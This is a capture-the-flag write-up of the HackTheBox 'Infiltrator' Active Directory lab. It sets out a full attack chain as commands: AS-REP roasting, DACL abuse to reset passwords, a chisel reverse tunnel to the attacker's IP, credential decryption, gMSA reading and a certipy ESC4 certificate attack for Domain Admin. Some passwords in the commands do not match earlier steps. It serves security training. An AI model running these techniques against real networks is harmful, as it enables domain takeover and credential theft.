---
title: "HackTheBox Infiltrator Writeup - Insane Active Directory Machine"
description: "Complete walkthrough of HackTheBox Infiltrator machine by Wathsala Dewmina (PwnedCake). An Insane-level Active Directory machine featuring Kerberos AS-REP roasting, BloodHound DACL exploitation, Output Messenger abuse, GMSA password reading, and ADCS ESC4 privilege escalation to Domain Admin."
author: Wathsala Dewmina
date: 2025-01-19 06:00:00 +0530
categories: [HackTheBox, Insane]
tags: [htb, active-directory, kerberos, bloodhound, adcs, esc4, output-messenger, dacl, gmsa, windows, as-rep-roasting, domain-admin, penetration-testing, red-team]
pin: false
image:
  path: /assets/img/htb-infiltrator/image.png
  alt: HackTheBox Infiltrator Machine Writeup by PwnedCake
keywords:
  - HackTheBox Infiltrator
  - Infiltrator Writeup
  - HTB Infiltrator
  - Active Directory Pentesting
  - ADCS ESC4 Attack
  - Kerberos Exploitation
  - BloodHound Attack Path
  - Domain Admin Privilege Escalation
  - PwnedCake Writeup
  - Wathsala Dewmina
---

## Machine Information

| Attribute | Details |
|:----------|:--------|
| **Machine Name** | Infiltrator |
| **Difficulty** | Insane |
| **OS** | Windows Server 2019 |
| **IP Address** | 10.10.11.31 |

---

## Reconnaissance

### Nmap Scan

Starting with a full port scan:

```bash
nmap -sCV -oN nmapInfiltrator -v -p- 10.10.11.31
```

**Key Ports:**

```text
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

This is clearly an Active Directory Domain Controller. Domain name is `infiltrator.htb` and the DC is `dc01.infiltrator.htb`.

### Web Enumeration

Checking the website on port 80, I found some employee names:

![Employee Names](/assets/img/htb-infiltrator/image.png)
_Employee names found on the website_

```text
david anderson
olivia martinez
kevin turner
amanda walker
marcus harris
lauren clark
```

Let's generate possible usernames using username-anarchy:

```bash
~/tools/username-anarchy/username-anarchy -i username_raw > username.list
```

---

## Initial Access

### Kerberos Enumeration

Using kerbrute to validate usernames:

![Kerbrute Results](/assets/img/htb-infiltrator/image%202.png)
_Found valid usernames_

### AS-REP Roasting

Let's try to get some hashes without authentication:

```bash
GetNPUsers.py -debug infiltrator.htb/ -request -usersfile usernames.list
```

![AS-REP Hash](/assets/img/htb-infiltrator/image%203.png)
_Got a hash for l.clark_

Cracking the hash:

![Cracked Hash](/assets/img/htb-infiltrator/image%204.png)
_Successfully cracked the password_

```text
l.clark:WAT?watismypass!
```

Let's verify it works:

```bash
nxc smb 10.10.11.31 -u l.clark -p 'WAT?watismypass!'
```

```text
SMB  10.10.11.31  445  DC01  [+] infiltrator.htb\l.clark:WAT?watismypass!
```

---

## BloodHound Analysis

Time to walk the dog! Let's collect data and analyze the domain.

![BloodHound Description](/assets/img/htb-infiltrator/image%205.png)
_Found something in a user description_

![Turner's Password](/assets/img/htb-infiltrator/image%206.png)
_Password hint in description_

Found `k.turner`'s password: `MessengerApp@Pass!` - but it doesn't work directly.

Looking further in BloodHound:

![Anderson Path](/assets/img/htb-infiltrator/image%207.png)
_d.anderson uses the same password_

Let's get a ticket for d.anderson and use Kerberos auth:

```bash
export KRB5CCNAME=d.anderson.ccache
nxc smb 10.10.11.31 --use-kcache
```

```text
SMB  10.10.11.31  445  DC01  [+] infiltrator.htb\d.anderson from ccache
```

### DACL Abuse Chain

![GenericAll on OU](/assets/img/htb-infiltrator/image%208.png)
_Anderson has GenericAll on Marketing Digital OU_

Anderson has `GenericAll` on the Marketing Digital OU, and `e.rodriguez` is in this OU. We can abuse this to change rodriguez's password.

Using dacledit to grant ourselves FullControl:

```bash
dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'd.anderson' \
  -target-dn 'OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB' \
  'infiltrator.htb/d.anderson' -k -no-pass -dc-ip dc01.INFILTRATOR.HTB
```

![Password Change](/assets/img/htb-infiltrator/image%209.png)
_Changing rodriguez's password_

Now change rodriguez's password:

```bash
bloodyAD --host "dc01.infiltrator.htb" -d "infiltrator.htb" --kerberos \
  --dc-ip dc01.INFILTRATOR.HTB -u "d.anderson" -p 'WAT?watismypass!' \
  set password "E.RODRIGUEZ" "Password@123"
```

### Moving Through the Domain

![Chiefs Marketing Group](/assets/img/htb-infiltrator/image%2010.png)
_Rodriguez can add self to Chiefs Marketing_

Add rodriguez to Chiefs Marketing:

```bash
bloodyAD -d infiltrator.htb -u 'E.rodriguez' -p 'Pwnedcake@2006' \
  --host dc01.infiltrator.htb add groupMember 'Chiefs Marketing' 'E.rodriguez'
```

![Harris Password Change](/assets/img/htb-infiltrator/image%2011.png)
_Chiefs Marketing can change M.harris's password_

![Harris Remote Users](/assets/img/htb-infiltrator/image%2012.png)
_Harris is in Remote Users group_

Change Harris's password:

```bash
bloodyAD --host "dc01.infiltrator.htb" -d "infiltrator.htb" \
  -u "E.rodriguez" -p "Pwnedcake@2006" set password "M.harris" "Pwnedcake@2006"
```

### Pass the Ticket

Since NTLM auth is blocked, we need to use Kerberos:

![NTLM Blocked](/assets/img/htb-infiltrator/image%2013.png)
_NTLM authentication blocked_

Edit `/etc/krb5.conf`:

```text
[libdefaults]
    default_realm = INFILTRATOR.HTB
    dns_lookup_kdc = false
    dns_lookup_realm = false

[realms]
    INFILTRATOR.HTB = {
        kdc = 10.10.11.31
        admin_server = 10.10.11.31
    }

[domain_realm]
    .infiltrator.htb = INFILTRATOR.HTB
    infiltrator.htb = INFILTRATOR.HTB
```

Get a ticket and login:

```bash
getTGT.py infiltrator.htb/M.HARRIS:'Pwnedcake@2006' -dc-ip 'dc01.infiltrator.htb'
export KRB5CCNAME=ticket.ccache
evil-winrm -i dc01.infiltrator.htb -r infiltrator.htb
```

> **User Flag Captured!**
{: .prompt-tip }

---

## Root - Output Messenger Exploitation

### Finding Internal Services

Using a C2 (Sliver) for stability, let's check what's running:

![Netstat Output](/assets/img/htb-infiltrator/image%2014.png)
_Found Output Messenger services on ports 14118-14130_

![Output Messenger Location](/assets/img/htb-infiltrator/image%2015.png)
_Located the application_

### Port Forwarding

Using chisel to forward the ports:

```bash
# On attacker
chisel server -p 9999 --reverse

# On target
chisel.exe client 10.10.14.172:9999 R:14121:127.0.0.1:14121 \
  R:14122:127.0.0.1:14122 R:14123:127.0.0.1:14123 \
  R:14124:127.0.0.1:14124 R:14125:127.0.0.1:14125 R:14126:127.0.0.1:14126
```

![Chisel Connected](/assets/img/htb-infiltrator/image%2023.png)
_Chisel tunnel established_

### Output Messenger Desktop Client

Remember the credentials `k.turner:MessengerApp@Pass!`? Let's try them in the Output Messenger client.

![Output Wall](/assets/img/htb-infiltrator/image%2025.png)
_Output Wall showing messages_

Found some credentials posted on the wall:

![Wall Credentials](/assets/img/htb-infiltrator/image%2029.png)
_Credentials shared on Output Wall_

![Valid Credentials](/assets/img/htb-infiltrator/image%2030.png)
_Credentials work_

### Extracting UserExplorer.exe

Logging in as harris, there's a file shared in admin's chat:

![File in Chat](/assets/img/htb-infiltrator/image%2032.png)
_UserExplorer.exe in admin chat_

![Download EXE](/assets/img/htb-infiltrator/image%2035.png)
_Downloaded the executable_

### Reverse Engineering with ILSpy

The file is a .NET assembly. Let's decompile it:

![ILSpy LdapApp](/assets/img/htb-infiltrator/image%2036.png)
_Found LdapApp function_

![Encrypted Credentials](/assets/img/htb-infiltrator/image%2037.png)
_Hardcoded encrypted credentials_

![DecryptString Function](/assets/img/htb-infiltrator/image%2038.png)
_Decryption function available_

I wrote a Python script to decrypt the credentials:

```python
import base64
from Crypto.Cipher import AES

def decrypt_string(key: str, cipher_text: str) -> str:
    key_bytes = key.encode("utf-8")
    cipher_bytes = base64.b64decode(cipher_text)
    cipher = AES.new(key_bytes, AES.MODE_CBC, iv=bytes(16))
    decrypted = cipher.decrypt(cipher_bytes).decode("utf-8")
    return decrypted.rstrip()

key = "b14ca5898a4e4133bbce2ea2315a1916"
cipher_text = input("Enter Base64 Ciphertext: ")
print(f"Decrypted: {decrypt_string(key, cipher_text)}")
```

![Decrypted Credentials](/assets/img/htb-infiltrator/image%2040.png)
_Got winrm_svc credentials_

```text
winrm_svc:WinRm@$svc^!^P
```

### API Enumeration

Found an API key in winrm_svc's notes:

![API Key](/assets/img/htb-infiltrator/image%2045.png)
_API key for Output Messenger_

```text
lan_management: 558R501T5I6024Y8JV3B7KOUN1A518GG
```

Using the API to enumerate chatrooms:

![Chatrooms](/assets/img/htb-infiltrator/image%2047.png)
_Found Chiefs_Marketing_chat_

Extracting the database from winrm_svc's Output Messenger folder:

![OM Database](/assets/img/htb-infiltrator/image%2049.png)
_Found room key in SQLite database_

Using the API to read chat logs:

```bash
/api/chatrooms/logs?roomkey=20240220014618@conference.com&fromdate=2023/01/01&todate=2024/12/01
```

![Chat Logs](/assets/img/htb-infiltrator/image%2055.png)
_Recovered chat with martinez's password_

```text
O.martinez : m@rtinez@1996!
```

### Calendar Remote Code Execution

The Windows client has a calendar feature that can run applications:

![Calendar Feature](/assets/img/htb-infiltrator/image%2060.png)
_Calendar with Run Application feature_

After setting up a scheduled task with our payload:

![Reverse Shell](/assets/img/htb-infiltrator/image%2063.png)
_Got shell as o.martinez_

### PCAP Analysis

Found a pcap file in martinez's Output Messenger folder:

![PCAP File](/assets/img/htb-infiltrator/image%2065.png)
_PCAP file found_

Analyzing in Wireshark:

![PCAP Password](/assets/img/htb-infiltrator/image%2066.png)
_Found martinez's actual password in traffic_

```text
O.martinez:M@rtinez_P@ssw0rd!
```

Also found a BitLocker backup file. Extracting and cracking it:

```bash
7z2john BitLocker_backup.7z > BitLocker_backup.7z.hash
john BitLocker_backup.7z.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```text
zipper           (BitLocker_backup.7z)
```

![BitLocker Recovery Key](/assets/img/htb-infiltrator/image%2075.png)
_Found recovery key_

### RDP and Registry Extraction

Using RDP to access martinez with the BitLocker drive:

```bash
xfreerdp /u:o.martinez /p:M@rtinez_P@ssw0rd! /v:10.10.11.31 /cert:ignore
```

![RDP Access](/assets/img/htb-infiltrator/image%2079.png)
_Unlocking the BitLocker drive_

Found SYSTEM and SECURITY registry hives:

![Registry Hives](/assets/img/htb-infiltrator/image%2081.png)
_Registry files extracted_

Also found an NTDS.dit file. Analyzing it with sqlite:

![Password Found](/assets/img/htb-infiltrator/image%2085.png)
_Found lan_managment password_

```text
lan_managment:l@n_M@an!1331
```

---

## ADCS ESC4 Attack

### GMSA Password Reading

Looking at BloodHound, lan_managment can read the GMSA password:

![GMSA Read](/assets/img/htb-infiltrator/image%2086.png)
_GMSA password readable_

```bash
bloodyAD --host "dc01.infiltrator.htb" -d "infiltrator.htb" -k \
  -u "lan_managment" -p 'l@n_M@an!1331' get object 'infiltrator_svc$' --attr msDS-ManagedPassword
```

![GMSA Hash](/assets/img/htb-infiltrator/image%2087.png)
_Got the NTLM hash_

Or using netexec:

```bash
nxc ldap dc01.infiltrator.htb -u lan_managment -p 'l@n_M@an!1331' --gmsa
```

![NXC GMSA](/assets/img/htb-infiltrator/image%2088.png)
_GMSA hash extracted_

### ADCS Enumeration

Running certipy to find vulnerable templates:

![Certipy Find](/assets/img/htb-infiltrator/image%2090.png)
_Found ESC4 vulnerable template_

![Template Details](/assets/img/htb-infiltrator/image%2091.png)
_Infiltrator_Template is vulnerable_

### Exploiting ESC4

First, modify the template:

```bash
certipy template -u 'infiltrator_svc$@infiltrator.htb' \
  -hashes ':91f6a2f300330325d5887462d4072732' \
  -template Infiltrator_Template -debug
```

![Template Modified](/assets/img/htb-infiltrator/image%2092.png)
_Template modified_

Request a certificate as Administrator:

```bash
certipy req -u 'infiltrator_svc$@infiltrator.htb' \
  -hashes ':91f6a2f300330325d5887462d4072732' \
  -dc-ip 10.10.11.31 -target "dc01.infiltrator.htb" \
  -ca 'infiltrator-DC01-CA' -template 'Infiltrator_Template' \
  -upn 'administrator@infiltrator.htb' -debug
```

![Certificate Request](/assets/img/htb-infiltrator/image%2093.png)
_Got Administrator's certificate_

Authenticate with the certificate:

```bash
certipy auth -pfx administrator.pfx
```

![Admin Hash](/assets/img/htb-infiltrator/image%2094.png)
_Got Administrator's NTLM hash_

Final pass-the-hash:

![Root Access](/assets/img/htb-infiltrator/image%2095.png)
_Domain Admin achieved!_

> **Root Flag Captured!**
{: .prompt-tip }

---

## Attack Chain Summary

1. **Enumerate users** from website and validate with Kerbrute
2. **AS-REP roast** l.clark and crack the hash
3. **BloodHound** reveals password hints in user descriptions
4. **DACL abuse chain**: anderson → rodriguez → harris
5. **Pass-the-ticket** to get shell as harris
6. **Output Messenger** exploitation through desktop client
7. **Reverse engineer** UserExplorer.exe for credentials
8. **API enumeration** to read chat logs
9. **Calendar RCE** for shell as martinez
10. **PCAP analysis** for more credentials
11. **BitLocker** drive contains registry hives
12. **GMSA password** reading for service account
13. **ADCS ESC4** attack for Domain Admin

---

## Key Takeaways

### Vulnerabilities Exploited

1. **AS-REP Roasting** - l.clark had pre-authentication disabled
2. **Sensitive Data in Descriptions** - Passwords in AD user descriptions
3. **DACL Misconfiguration** - GenericAll on OU allowed privilege escalation
4. **Output Messenger** - Calendar feature allowed code execution
5. **GMSA Password Readable** - Service account hash extractable
6. **ADCS ESC4** - Misconfigured certificate template

### Lessons Learned

> Never store passwords in user descriptions or comments. Use a proper secret management solution.
{: .prompt-warning }

> ADCS misconfigurations are extremely common and dangerous. Regular audits with tools like Certipy are essential.
{: .prompt-danger }

> Internal messaging applications can be attack vectors. Audit what data is shared through them.
{: .prompt-info }

---

## Tools Used

- **Nmap** - Port scanning
- **Kerbrute** - Username enumeration
- **Impacket** - Kerberos attacks, secretsdump
- **BloodHound** - AD attack path analysis
- **BloodyAD** - AD exploitation
- **Certipy** - ADCS enumeration and exploitation
- **Chisel** - Port forwarding
- **ILSpy** - .NET decompilation
- **Wireshark** - PCAP analysis
- **Evil-WinRM** - Windows remote management

---

## Conclusion

Infiltrator is one of the best machines I've done. It's a proper Active Directory box that tests everything from initial enumeration to complex privilege escalation chains. The Output Messenger part was unique and the ADCS finale was satisfying.

This machine teaches you:
- How real AD environments get compromised
- The importance of BloodHound in finding attack paths
- How DACL misconfigurations can chain together
- Why ADCS needs proper configuration

**Final Stats:**
- Time to User: ~8 hours
- Time to Root: ~6 hours
- Difficulty Rating: Insane (Truly Insane)

Thanks for reading! Happy Hacking!
